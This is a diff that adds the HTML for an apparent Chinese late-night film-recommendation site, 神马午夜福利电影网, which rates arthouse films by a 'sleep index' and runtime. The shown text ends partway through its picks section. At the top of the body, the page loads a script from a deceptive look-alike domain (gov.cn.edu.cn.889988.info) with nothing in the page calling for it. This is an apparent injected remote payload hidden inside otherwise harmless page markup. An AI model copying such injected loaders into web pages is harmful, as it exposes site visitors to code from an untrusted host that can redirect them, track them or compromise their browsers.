@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="神马午夜福利电影网（shenmawuyefulidianyingwang-cn.github.io）是深夜时段的电影福利指南：按就寝前剩余时间、助眠指数、对白密度、画面亮度四项指标，推荐适合 23:00 之后观看的正版免费与限时免费电影。含失眠片单、雨天片单、下饭片单、独居片单与深夜观影设置，附正版平台入口。">
+<meta name="keywords" content="神马午夜福利电影网, shenmawuyefulidianyingwang, 午夜电影, 深夜电影, 午夜福利, 失眠电影, 助眠电影, 睡前电影, 深夜观影, 夜间电影, 下雨天电影, 下饭剧, 独居电影, 治愈电影, 安静电影, 极简对白, 长镜头, 文艺片, 慢电影, 经典电影, 高分电影, 冷门佳片, 免费电影, 正版免费, 限时免费, 公版电影, 4K修复, 电影推荐, 电影在线观看, 侯孝贤, 是枝裕和, 小津安二郎, 阿彼察邦, 贝拉·塔尔">
+<meta name="author" content="神马午夜福利电影网">
+<meta name="robots" content="index, follow">
+<title>神马午夜福利电影网 - 深夜时段的电影福利指南 · 23:00 之后，看什么</title>
+<link rel="canonical" href="https://shenmawuyefulidianyingwang-cn.github.io/">
+<style>
+/* ================= 基础 ================= */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#15131a; --ink2:#201c26; --paper:#fdfbf6; --line:#e7dfd0;
+  --tx:#2a2730; --sub:#7a7382;
+  --em:#ff6b2c;   /* 暖橙 */
+  --em2:#ff9f1c;  /* 琥珀 */
+  --deep:#1c2a4a; /* 深夜蓝 */
+  --deep2:#2f4a7a;
+  --plum:#7b4b8a;
+  --mg:'Marck Script','Dancing Script',cursive;
+  --serif:'Songti SC','STSong','SimSun','Noto Serif CJK SC',Georgia,serif;
+  --mono:'JetBrains Mono','SFMono-Regular',Consolas,Menlo,monospace;
+}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--paper);color:var(--tx);line-height:1.9;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none;outline:none}
+::selection{background:var(--em);color:#fff}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+.sec{padding:104px 0;position:relative}
+.sec-h{display:flex;align-items:baseline;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:52px}
+.sec-t{font-size:31px;font-weight:900;letter-spacing:.4px;display:flex;align-items:center;gap:13px}
+.sec-t .tag{font-size:9px;letter-spacing:2.5px;color:#fff;background:var(--em);padding:6px 12px;font-weight:900;border-radius:999px;font-family:var(--mono)}
+.sec-s{color:var(--sub);font-size:11px;letter-spacing:1.5px;font-family:var(--mono)}
+.eyebrow{font-family:var(--mono);font-size:9.5px;letter-spacing:3.5px;color:var(--em);font-weight:900}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:15px 30px;border-radius:999px;font-weight:900;font-size:13.5px;cursor:pointer;border:2.5px solid var(--em);transition:.24s;white-space:nowrap;letter-spacing:1px}
+.btn-p{background:var(--em);color:#fff;box-shadow:0 10px 26px rgba(255,107,44,.34)}
+.btn-p:hover{transform:translateY(-3px);box-shadow:0 16px 36px rgba(255,107,44,.48)}
+.btn-o{background:transparent;color:var(--em)}
+.btn-o:hover{background:rgba(255,107,44,.10)}
+.pill{display:inline-block;padding:3px 10px;font-size:10px;font-weight:900;letter-spacing:.5px;font-family:var(--mono);border-radius:999px}
+.pill.e{background:var(--em);color:#fff}
+.pill.y{background:var(--em2);color:#2a1a00}
+.pill.d{background:var(--deep);color:#fff}
+.pill.p{background:var(--plum);color:#fff}
+.quote{font-family:var(--serif);font-style:italic;color:var(--deep);line-height:1.8}
+
+/* ================= 顶导 ================= */
+.nav{position:sticky;top:0;z-index:60;background:rgba(253,251,246,.96);backdrop-filter:blur(8px);border-bottom:2px solid var(--line)}
+.nav-in{display:flex;align-items:center;gap:18px;height:76px}
+.logo{font-size:19px;font-weight:900;white-space:nowrap;display:flex;align-items:center;gap:13px;letter-spacing:.6px;font-family:var(--serif)}
+.logo .lm{width:46px;height:46px;border-radius:50%;background:linear-gradient(160deg,var(--em),var(--em2));color:#fff;display:flex;align-items:center;justify-content:center;font-size:21px;font-weight:900;box-shadow:0 6px 18px rgba(255,107,44,.4);position:relative}
+.logo .lm::after{content:'✦';position:absolute;top:-7px;right:-9px;font-size:14px;color:var(--deep2);animation:sp 3.6s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.logo small{font-size:8px;color:var(--em);letter-spacing:2.4px;display:block;margin-top:4px;font-family:var(--mono)}
+.clock{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--sub);letter-spacing:1.5px;display:flex;align-items:center;gap:8px;font-weight:900}
+.clock::before{content:'';width:8px;height:8px;border-radius:50%;background:var(--em);box-shadow:0 0 10px var(--em);animation:bb .9s ease-in-out infinite alternate}
+@keyframes bb{from{opacity:1}to{opacity:.25}}
+.menu{display:flex;gap:2px}
+.menu a{padding:11px 14px;font-size:13.5px;color:var(--sub);transition:.22s;white-space:nowrap;font-weight:700;position:relative;border-radius:999px}
+.menu a:hover,.menu a.on{color:var(--em);background:rgba(255,107,44,.10)}
+.menu a::after{content:'';position:absolute;left:50%;bottom:4px;width:5px;height:5px;border-radius:50%;background:var(--em);transform:translateX(-50%) scale(0);transition:.22s}
+.menu a:hover::after,.menu a.on::after{transform:translateX(-50%) scale(1)}
+.hamb{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px}
+.hamb i{width:23px;height:2px;background:var(--em);border-radius:2px}
+
+/* ================= HERO ================= */
+.hero{position:relative;overflow:hidden;padding:74px 0 96px;background:
+  radial-gradient(900px 520px at 90% 6%, rgba(255,107,44,.20), transparent 62%),
+  radial-gradient(760px 460px at 4% 96%, rgba(28,42,74,.18), transparent 62%),
+  linear-gradient(160deg,#fff9f2,#fdfbf6);color:var(--tx)}
+.hero .moon{position:absolute;right:7%;top:12%;width:180px;height:180px;border-radius:50%;background:radial-gradient(circle at 35% 30%,#fff6e6,#ffe6bd 45%,#f7d69a);box-shadow:0 0 90px 30px rgba(255,209,150,.55);opacity:.9}
+.hero .moon::before{content:'';position:absolute;inset:0;border-radius:50%;box-shadow:inset -26px -20px 40px rgba(200,150,90,.45)}
+.hero .star{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--deep2);opacity:.5;animation:tw 2.6s ease-in-out infinite alternate}
+@keyframes tw{from{opacity:.2;transform:scale(.7)}to{opacity:1;transform:scale(1.3)}}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1fr .94fr;gap:56px;align-items:center}
+.hero .kicker{font-family:var(--mono);font-size:10px;letter-spacing:4px;color:var(--em);font-weight:900}
+.hero h1{font-size:56px;font-weight:900;line-height:1.2;margin:14px 0;letter-spacing:-1px;font-family:var(--serif)}
+.hero h1 em{font-style:normal;color:var(--em);position:relative;display:inline-block}
+.hero h1 em::after{content:'';position:absolute;left:0;right:0;bottom:6px;height:8px;background:rgba(255,159,28,.34);z-index:-1;border-radius:4px}
+.hero h1 .t{display:block;font-size:17px;font-family:var(--mono);letter-spacing:2px;color:var(--deep2);margin-top:10px;font-weight:700}
+.hero .lede{font-size:15.5px;color:#524c58;margin-bottom:24px;max-width:560px}
+.hero .acts{display:flex;gap:12px;flex-wrap:wrap}
+.hero .notes{margin-top:24px;display:flex;gap:9px;flex-wrap:wrap}
+.hero .notes span{font-size:11px;color:var(--sub);border:1px solid var(--line);background:#fff;padding:5px 12px;font-family:var(--mono);letter-spacing:.5px;border-radius:999px}
+.night{background:var(--ink);color:#f4efe6;border-radius:22px;padding:24px 26px;position:relative;overflow:hidden;transform:rotate(-1.2deg);box-shadow:0 26px 70px rgba(20,18,26,.28)}
+.night .tk{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--em2);font-weight:900}
+.night h3{font-family:var(--serif);font-size:19px;margin:9px 0 16px;line-height:1.55;color:#fff}
+.night ol{list-style:none;counter-reset:nm}
+.night li{counter-increment:nm;padding:9px 0 9px 42px;position:relative;font-size:12.6px;color:#ddd3c2;line-height:1.72;border-bottom:1px dashed rgba(255,255,255,.14)}
+.night li:last-child{border-bottom:0}
+.night li::before{content:'0' counter(nm);position:absolute;left:0;top:9px;font-family:var(--mono);font-size:10.5px;font-weight:900;color:var(--em2);letter-spacing:1px}
+.night .bar{margin-top:16px;height:6px;border-radius:6px;background:linear-gradient(90deg,var(--em) 0%, var(--em2) 46%, var(--deep2) 74%, #4a5878 100%);position:relative}
+.night .bar::after{content:'距入睡 ≈ 86 min';position:absolute;right:0;top:-20px;font-family:var(--mono);font-size:10px;color:var(--em2);letter-spacing:1px}
+
+/* ================= 栏目1：时段（时间轴刻度 + 双色进度 + 图标徽章） ================= */
+.slot{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.slot>div{background:#fff;border:2px solid var(--line);border-radius:18px;padding:20px 18px;position:relative;transition:.3s;overflow:hidden}
+.slot>div::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:var(--em)}
+.slot>div:nth-child(2)::before{background:var(--em2)}
+.slot>div:nth-child(3)::before{background:var(--deep)}
+.slot>div:nth-child(4)::before{background:var(--plum)}
+.slot>div:hover{transform:translateY(-9px);border-color:var(--em);box-shadow:0 20px 44px rgba(255,107,44,.20)}
+.slot .ic{width:52px;height:52px;border-radius:50%;background:rgba(255,107,44,.12);display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:12px;transition:.3s}
+.slot>div:hover .ic{background:var(--em);color:#fff;transform:rotate(-12deg) scale(1.08)}
+.slot .tm{font-family:var(--mono);font-size:11px;letter-spacing:1.5px;color:var(--em);font-weight:900}
+.slot h4{font-size:16.5px;margin:5px 0 10px;font-family:var(--serif)}
+.slot .bar{height:8px;border-radius:6px;background:#f0ebe1;overflow:hidden;margin:8px 0 6px}
+.slot .bar i{display:block;height:100%;width:calc(var(--v,60) * 1%);background:linear-gradient(90deg,var(--em),var(--em2));border-radius:6px;transition:width .9s cubic-bezier(.22,1,.36,1)}
+.slot .v{font-family:var(--mono);font-size:10.5px;color:var(--sub);display:flex;justify-content:space-between;margin-bottom:9px}
+.slot p{font-size:11.8px;color:var(--sub);line-height:1.85}
+.slot .pick{margin-top:10px;font-size:10.5px;font-weight:900;color:var(--deep);font-family:var(--mono);letter-spacing:.4px}
+
+/* ================= 栏目2：福利榜（带表头表 + 三色成本标签） ================= */
+.rank{display:grid;grid-template-columns:repeat(2,1fr);border:2px solid var(--line);border-radius:18px;overflow:hidden;background:#fff}
+.rank .th{display:grid;grid-template-columns:54px 1fr 96px;gap:14px;padding:13px 20px;background:var(--deep);color:#fff;font-family:var(--mono);font-size:10px;letter-spacing:2px;font-weight:900}
+.rank .th.r{background:var(--em)}
+.rank .row{display:grid;grid-template-columns:54px 1fr 96px;align-items:center;gap:14px;padding:16px 20px;border-bottom:1px solid var(--line);border-right:1px solid var(--line);transition:.22s}
+.rank .row:nth-child(2n){border-right:0}
+.rank .row:nth-last-child(-n+2){border-bottom:0}
+.rank .row:hover{background:#fff6ec}
+.rank .no{font-family:var(--mono);font-size:22px;font-weight:900;color:var(--em);line-height:1}
+.rank .no small{display:block;font-size:7.5px;letter-spacing:1.5px;color:var(--sub);margin-top:3px;font-weight:700}
+.rank h4{font-size:15px;line-height:1.45}
+.rank h4 b{font-weight:900;display:block;font-size:15.5px}
+.rank h4 span{font-size:10.5px;font-family:var(--mono);color:var(--sub);letter-spacing:.6px}
+.rank .cost{text-align:right;font-size:10.5px;font-weight:900;font-family:var(--mono);letter-spacing:.5px}
+.rank .cost.free{color:#1f9d63}
+.rank .cost.vip{color:var(--em)}
+.rank .cost.pay{color:#8a8375}
+
+/* ================= 栏目3：片单（圆角卡片 + 渐变封面 + 助眠指数气泡） ================= */
+.pick{background:#fff;border:2px solid var(--line);border-radius:20px;overflow:hidden;display:flex;flex-direction:column;transition:.34s;position:relative}
+.pick:hover{transform:translateY(-10px);border-color:var(--em);box-shadow:0 26px 60px rgba(255,107,44,.24)}
+.pick .cvr{height:150px;position:relative;padding:16px 18px;color:#fff;display:flex;align-items:flex-end;font-family:var(--serif);font-size:10px;line-height:1.6}
+.pick .cvr .glow{position:absolute;inset:0;background:radial-gradient(circle at 82% 18%,rgba(255,255,255,.30),transparent 46%)}
+.pick .cvr b{font-size:22px;font-weight:900;line-height:1.25;text-shadow:0 2px 18px rgba(0,0,0,.35);z-index:2;font-family:var(--serif)}
+.pick .cvr .sl{position:absolute;top:14px;right:14px;background:rgba(20,18,26,.55);color:var(--em2);font-family:var(--mono);font-size:9.5px;font-weight:900;padding:5px 10px;border-radius:999px;letter-spacing:.8px;backdrop-filter:blur(4px)}
+.pick .body{padding:16px 18px 18px;display:flex;flex-direction:column;flex:1}
+.pick .body .hd{display:flex;justify-content:space-between;align-items:flex-start;gap:8px}
+.pick .body h4{font-size:16px;line-height:1.42}
+.pick .body p{font-size:12.3px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;line-height:1.85;margin-top:8px;flex:1}
+.pick .body .ft{margin-top:11px;display:flex;justify-content:space-between;align-items:center;border-top:1px dashed var(--line);padding-top:10px;font-size:11.5px;font-weight:900;letter-spacing:.5px;color:var(--em);font-family:var(--mono)}
+.pick .body .ft span:last-child{color:var(--deep)}
+
+/* ================= 栏目4：场景选片（Tabs 标签切换 + 深蓝侧栏） ================= */
+.guide{display:grid;grid-template-columns:1fr .86fr;gap:28px;align-items:start}
+.tabs{border:2px solid var(--line);border-radius:18px;overflow:hidden;background:#fff}
+.tab-hd{display:flex;flex-wrap:wrap;background:#f7f2e8;border-bottom:2px solid var(--line)}
+.tab-hd button{flex:1;min-width:96px;padding:15px 10px;background:transparent;border:0;border-right:1px solid var(--line);font-size:12.5px;font-weight:900;cursor:pointer;color:var(--sub);transition:.2s;font-family:var(--mono);letter-spacing:.6px}
+.tab-hd button:last-child{border-right:0}
+.tab-hd button.on{background:var(--em);color:#fff;box-shadow:inset 0 -5px 0 rgba(0,0,0,.14)}
+.tab-bd{display:none;padding:24px 26px;animation:fade .3s}
+.tab-bd.on{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.tab-bd h4{font-size:18px;font-family:var(--serif);margin-bottom:10px;line-height:1.5}
+.tab-bd p{font-size:13.4px;color:#4f4954;line-height:1.95}
+.tab-bd p b{color:var(--em)}
+.tab-bd .chips{display:flex;gap:7px;flex-wrap:wrap;margin-top:14px}
+.tab-bd .chips i{font-style:normal;font-size:10.5px;font-weight:900;font-family:var(--mono);color:var(--deep);border:1.5px solid var(--deep);padding:4px 11px;border-radius:999px;letter-spacing:.4px}
+.side{background:var(--deep);color:#eae3d4;padding:26px 28px;border-radius:18px;box-shadow:0 22px 56px rgba(28,42,74,.30)}
+.side h4{font-family:var(--serif);font-size:20px;color:#fff;line-height:1.5}
+.side .sub{font-size:9.5px;letter-spacing:2.5px;color:var(--em2);font-family:var(--mono);margin:8px 0 16px}
+.side dl{margin:0}
+.side dt{font-family:var(--mono);font-size:10.5px;letter-spacing:1.4px;color:var(--em2);font-weight:900;margin-top:13px}
+.side dd{font-size:12.6px;color:#ddd0bd;line-height:1.75}
+.side .net{margin-top:18px;display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:10.5px;color:var(--em2);letter-spacing:1px}
+.side .net .dot{width:9px;height:9px;border-radius:50%;background:var(--em2);box-shadow:0 0 12px var(--em2);animation:bb 1.1s ease-in-out infinite}
+
+/* ================= 栏目5：长文（报纸 masthead + 首字下沉 + 分栏） ================= */
+.essay{border:2px solid var(--ink);border-radius:6px;overflow:hidden;background:#fffdf8}
+.essay .mh{text-align:center;padding:26px 20px 18px;border-bottom:3px double var(--ink)}
+.essay .mh .e{font-family:var(--mono);font-size:9.5px;letter-spacing:4px;color:var(--em);font-weight:900}
+.essay .mh h3{font-family:var(--serif);font-size:32px;font-weight:900;margin:8px 0;letter-spacing:1px;line-height:1.3}
+.essay .mh .by{font-size:11px;color:var(--sub);letter-spacing:1px;font-family:var(--mono)}
+.essay .in{padding:28px 34px 34px;column-count:2;column-gap:42px;column-rule:1px solid var(--line);font-size:13.6px;line-height:2.05;color:#3a3540;text-align:justify}
+.essay .in p{margin-bottom:13px}
+.essay .in p:first-of-type::first-letter{font-family:var(--serif);font-size:52px;font-weight:900;color:var(--em);float:left;line-height:.86;margin:4px 9px 0 0}
+.essay .in blockquote{column-span:all;break-inside:avoid;border-top:2px solid var(--em);border-bottom:2px solid var(--em);padding:16px 20px;margin:8px 0 20px;color:var(--deep);font-family:var(--serif);font-size:17px;line-height:1.85;text-align:center;font-style:italic}
+.essay .in .end{text-align:center;font-family:var(--mono);color:var(--em);letter-spacing:3px;font-size:11px;margin-top:6px}
+
+/* ================= 栏目6：关于 ================= */
+.about{border:2px solid var(--ink);border-radius:6px;padding:46px;background:linear-gradient(160deg,#fffdf8,#fbf6ec);position:relative}
+.about::before{content:'福利';position:absolute;right:26px;top:22px;font-family:var(--serif);font-size:60px;color:rgba(255,107,44,.14);font-weight:900;line-height:1}
+.about .lh{display:grid;grid-template-columns:1fr .9fr;gap:44px;margin-bottom:34px}
+.about .lh h2{font-family:var(--serif);font-size:33px;line-height:1.4;font-weight:900}
+.about .lh h2 u{text-decoration:none;color:var(--em);border-bottom:5px solid var(--deep2);display:inline-block}
+.about .lh .lead{color:#524c58;font-size:14.5px;margin-top:14px;line-height:2}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);border-top:2px solid var(--ink);border-bottom:2px solid var(--ink)}
+.stats div{text-align:center;padding:24px 8px}
+.stats b{display:block;font-size:31px;font-weight:900;color:var(--em);line-height:1.1;font-family:var(--serif)}
+.stats small{font-size:10px;color:var(--sub);letter-spacing:1.5px;font-family:var(--mono)}
+.feat{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.feat div{border:2px solid var(--line);padding:22px;background:#fff;border-radius:14px}
+.feat h4{font-size:15.5px;margin-bottom:9px;display:flex;align-items:center;gap:9px;font-family:var(--serif)}
+.feat h4 .tk{width:30px;height:30px;border-radius:50%;background:var(--em);color:#fff;font-size:12.5px;display:inline-flex;align-items:center;justify-content:center;font-weight:900;flex:0 0 auto;font-family:var(--mono)}
+.feat p{font-size:12.8px;color:var(--sub);line-height:1.9}
+.feat p b{color:var(--em)}
+.siteinfo{margin-top:26px;padding:24px;border:2px solid var(--line);font-size:13px;color:var(--sub);line-height:2.05;border-radius:14px;background:#fff}
+.siteinfo b{color:var(--em)}
+
+/* ================= 网格 ================= */
+.grid{display:grid;gap:18px}
+.g6{grid-template-columns:repeat(6,1fr)}
+.g5{grid-template-columns:repeat(5,1fr)}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+
+/* ================= 页脚 ================= */
+.foot{border-top:2px solid var(--ink);padding:56px 0 26px;color:var(--sub);font-size:13px;background:#f4efe6}
+.f-top{display:flex;justify-content:space-between;flex-wrap:wrap;gap:26px;margin-bottom:28px}
+.f-links a{margin-right:22px;color:var(--sub);font-size:13px;transition:.2s;font-family:var(--mono);font-size:12px}
+.f-links a:hover{color:var(--em)}
+.f-cat{display:grid;grid-template-columns:repeat(6,1fr);gap:9px 24px;margin:22px 0;font-family:var(--mono);font-size:11.5px}
+.f-cat a{color:var(--sub);transition:.2s}
+.f-cat a:hover{color:var(--em)}
+.copy{text-align:center;border-top:1px dashed var(--line);padding-top:22px;letter-spacing:.5px;font-family:var(--mono);font-size:11px;color:#8c8594}
+.copy b{color:var(--em)}
+
+/* ================= 移动端 ================= */
+@media(max-width:1100px){.g6,.g5{grid-template-columns:repeat(4,1fr)}.g4,.g3{grid-template-columns:repeat(3,1fr)}.about .lh{grid-template-columns:1fr}.slot{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:46px}.hero h1{font-size:42px}.night{transform:none}
+  .g3,.g2,.feat,.guide{grid-template-columns:1fr}
+  .essay .in{column-count:1;padding:22px 18px;font-size:12.6px}
+  .rank{grid-template-columns:1fr}.rank .row{border-right:0}
+}
+@media(max-width:760px){
+  .g6,.g5,.g4,.g3,.slot{grid-template-columns:repeat(2,1fr);gap:13px}
+  .clock{display:none}
+}
+@media(max-width:640px){
+  .sec{padding:64px 0}.sec-t{font-size:21px;flex-wrap:wrap}
+  .nav-in{height:68px;gap:10px}
+  .hamb{display:flex}
+  .menu{display:none;position:absolute;top:68px;left:0;right:0;background:#fffdf8;flex-direction:column;padding:10px;border-bottom:2px solid var(--em)}
+  .menu.open{display:flex}
+  .menu a{text-align:center;padding:13px;border-bottom:1px solid var(--line);color:var(--sub)}
+  .hero{padding:46px 0}.hero .wrap{padding:26px 24px}.hero h1{font-size:29px}
+  .g6,.g5,.g4,.g3,.g2,.feat,.about .stats,.slot{grid-template-columns:1fr}
+  .f-cat{grid-template-columns:repeat(2,1fr)}
+  .about{padding:26px 16px}.about .lh h2{font-size:22px}
+  .essay .mh h3{font-size:23px}
+  .tab-hd{flex-wrap:nowrap;overflow-x:auto}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ============ 顶部导航 ============ -->
+<header class="nav">
+  <div class="wrap nav-in">
+    <a class="logo" href="#">
+      <span class="lm">午</span>
+      <span>神马午夜福利电影网<small>MIDNIGHT WELFARE</small></span>
+    </a>
+    <div class="clock" id="clock">23:14 · 距入睡 46 min</div>
+    <nav class="menu" id="menu">
+      <a href="#home">今晚看什么</a>
+      <a href="#slot">时段</a>
+      <a href="#rank">福利榜</a>
+      <a href="#pick">片单</a>
+      <a href="#scene">场景选片</a>
+      <a href="#essay">长文</a>
+      <a href="#about">关于</a>
+    </nav>
+    <div class="hamb" id="hamb"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- ============ HERO ============ -->
+<section class="hero" id="home">
+  <span class="moon" aria-hidden="true"></span>
+  <span class="star" style="top:14%;left:12%"></span>
+  <span class="star" style="top:26%;left:28%"></span>
+  <span class="star" style="top:9%;left:46%"></span>
+  <span class="star" style="top:34%;left:62%"></span>
+  <span class="star" style="top:18%;left:78%"></span>
+  <span class="star" style="top:6%;left:34%"></span>
+  <div class="wrap">
+    <div>
+      <span class="kicker">// MIDNIGHT · 23:00 — 01:00</span>
+      <h1><em>午夜</em>的福利，<br>是终于可以<em>慢慢看</em>一部电影<span class="t">神马午夜福利电影网 · 深夜时段的电影福利指南</span></h1>
+      <p class="lede">神马午夜福利电影网（shenmawuyefulidianyingwang-cn.github.io）不是"深夜放片"，而是一座<b>按就寝时间推荐电影的福利指南</b>。我们不按明星、类型或热度推荐，按<b>你还剩多少时间</b>推荐：23:00 之后，选一部<b>对白少、画面暗、节奏慢、不长</b>的电影，配一杯温水，比刷短视频更能让人睡得着。片单以侯孝贤、是枝裕和、小津安二郎、阿彼察邦、贝拉·塔尔为主轴，标注<b>正版免费 / 会员免费 / 单片付费 / 公版</b>四种成本，以及助眠指数、片长、修复状态与正版入口。</p>
+      <div class="acts">
+        <a class="btn btn-p" href="#pick">今晚的片单 →</a>
+        <a class="btn btn-o" href="#scene">按场景选片</a>
+      </div>
+      <div class="notes">
+        <span>✔ 正版免费专区</span><span>✔ 限时免费</span><span>✔ 公版老片</span><span>✔ 助眠友好</span><span>✔ 4K 修复</span>
+      </div>
+    </div>
+    <div class="night">
+      <div class="tk">SLEEP CHECK · 距入睡还有多少分钟</div>
+      <h3>选片之前，先回答：<span style="color:var(--em2)">你现在，还能坐多久？</span></h3>
+      <ol>
+        <li><b>≤ 35 min</b>→ 是枝裕和《花之武者》91 min 太长；请选短片：阿彼察邦《湄公河酒店》17 min</li>
+        <li><b>35 – 70 min</b>→ 小津安二郎《早安》94 min 分两天；今晚先看前 40 分钟</li>
+        <li><b>70 – 100 min</b>→ 是枝裕和《步履不停》114 min，静态构图，最适合睡前</li>
+        <li><b>&gt; 100 min</b>→ 贝拉·塔尔《都灵之马》146 min，请把风听完，明天再说</li>
+      </ol>
+      <div class="bar"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目1：时段（时间轴刻度 + 双色进度 + 图标徽章） ============ -->
+<section class="sec" id="slot">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">SLOT</span>午夜四时段</h2>
+      <span class="sec-s">按就寝前剩余时间分档 · 助眠指数越高越安静</span>
+    </div>
+    <div class="grid g4 slot">
+      <div style="--v:86"><div class="ic">🌆</div><div class="tm">23:00 — 23:40</div><h4>饭后余温</h4><div class="bar"><i></i></div><div class="v"><span>助眠 86</span><span>100</span></div><p>灯还亮着，胃刚空。适合"一家人吃饭"的电影：对白多、暖色、节奏平稳，看完正好刷牙。</p><div class="pick">→ 是枝裕和《步履不停》114 min</div></div>
+      <div style="--v:72"><div class="ic">🌙</div><div class="tm">23:40 — 00:20</div><h4>夜深一点</h4><div class="bar"><i></i></div><div class="v"><span>助眠 72</span><span>100</span></div><p>房间暗了，声音敏感。适合"雨声大于对白"的电影：环境音、长镜头、几乎没有配乐。</p><div class="pick">→ 阿彼察邦《能召回前世的布米叔叔》114 min</div></div>
+      <div style="--v:58"><div class="ic">🌌</div><div class="tm">00:20 — 01:00</div><h4>失眠档</h4><div class="bar"><i></i></div><div class="v"><span>助眠 58</span><span>100</span></div><p>注意力散了，别挑战剧情。适合"可以睡着也不亏"的电影：极简对白、静态构图、黑白。</p><div class="pick">→ 小津安二郎《东京物语》136 min（分两天）</div></div>
+      <div style="--v:40"><div class="ic">🕯️</div><div class="tm">01:00 以后</div><h4>凌晨档</h4><div class="bar"><i></i></div><div class="v"><span>助眠 40</span><span>100</span></div><p>不建议开新片。请重看一部看过的老片，或者：直接关掉。睡眠不是敌人，错过才是。</p><div class="pick">→ 侯孝贤《恋恋风尘》105 min（二刷）</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目2：福利榜（带表头表 + 三色成本标签） ============ -->
+<section class="sec" id="rank" style="background:linear-gradient(180deg,#fdfbf6,#f7f2e8)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">TOP 8</span>午夜福利榜</h2>
+      <a class="btn btn-o" href="#" style="border-color:var(--em)">完整 40 部 →</a>
+    </div>
+    <div class="rank">
+      <div class="th"><span>NO.</span><span>影片 / 导演 / 年份</span><span>成本</span></div>
+      <div class="th r"><span>NO.</span><span>影片 / 导演 / 年份</span><span>成本</span></div>
+      <div class="row"><div class="no">01<small>SLEEP</small></div><div class="tx"><h4><b>步履不停</b><span>是枝裕和 · 2008 · 助眠 96</span></h4></div><div class="cost free">正版免费</div></div>
+      <div class="row"><div class="no">02<small>SLEEP</small></div><div class="tx"><h4><b>东京物语</b><span>小津安二郎 · 1953 · 助眠 94</span></h4></div><div class="cost free">公版</div></div>
+      <div class="row"><div class="no">03<small>SLEEP</small></div><div class="tx"><h4><b>恋恋风尘</b><span>侯孝贤 · 1986 · 助眠 92</span></h4></div><div class="cost vip">会员免费</div></div>
+      <div class="row"><div class="no">04<small>SLEEP</small></div><div class="tx"><h4><b>早安</b><span>小津安二郎 · 1959 · 助眠 90</span></h4></div><div class="cost free">公版</div></div>
+      <div class="row"><div class="no">05<small>SLEEP</small></div><div class="tx"><h4><b>能召回前世的布米叔叔</b><span>阿彼察邦 · 2010 · 助眠 87</span></h4></div><div class="cost vip">会员免费</div></div>
+      <div class="row"><div class="no">06<small>SLEEP</small></div><div class="tx"><h4><b>都灵之马</b><span>贝拉·塔尔 · 2011 · 助眠 84</span></h4></div><div class="cost pay">¥ 3.00</div></div>
+      <div class="row"><div class="no">07<small>SLEEP</small></div><div class="tx"><h4><b>花之武者</b><span>是枝裕和 · 2006 · 助眠 81</span></h4></div><div class="cost vip">会员免费</div></div>
+      <div class="row"><div class="no">08<small>SLEEP</small></div><div class="tx"><h4><b>镜子</b><span>塔可夫斯基 · 1975 · 助眠 78</span></h4></div><div class="cost pay">¥ 6.00</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目3：片单（圆角卡片 + 渐变封面 + 助眠气泡） ============ -->
+<section class="sec" id="pick">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">PICKS</span>午夜片单</h2>
+      <span class="sec-s">标注成本 · 助眠指数 · 片长 · 修复 · 正版入口</span>
+    </div>
+    <div class="grid g3">
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#c97b4a,#7a4a2e)"><span class="glow"></span><span class="sl">助眠 96</span><b>步履不停</b></div><div class="body"><div class="hd"><h4>步履不停</h4><span class="pill e">正版免费</span></div><p>是枝裕和 2008。横山家的一天：厨房、台阶、院子、走廊。对白温柔，配乐极轻，画面几乎不动——<b>这是最接近"听"的电影</b>。</p><span class="ft"><span>4K 修复 →</span><span>114 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#4a5878,#232c42)"><span class="glow"></span><span class="sl">助眠 94</span><b>东京物语</b></div><div class="body"><div class="hd"><h4>东京物语</h4><span class="pill y">公版</span></div><p>小津安二郎 1953。黑白、1.33:1、榻榻米高度机位。没有一场戏是"必须看"的，所以睡着也不可惜。<b>公版，可放心看</b>。</p><span class="ft"><span>4K 修复 →</span><span>136 MIN</span></span></div></article>
